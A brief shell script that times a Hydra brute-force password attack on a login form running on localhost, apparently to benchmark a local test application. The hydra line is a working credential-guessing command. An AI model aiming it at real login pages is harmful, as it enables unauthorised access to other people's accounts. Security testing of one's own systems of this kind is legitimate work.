start=$(date +%s)
hydra -L ../assets/lists/usernames.txt -P ../assets/lists/test/test500pws.txt localhost http-post-form "/ba/php/login_handler:username=^USER^&password=^PASS^:F=Login" -f -V
end=$(date +%s)
runtime=$((end - start))
echo "Runtime: $runtime seconds"
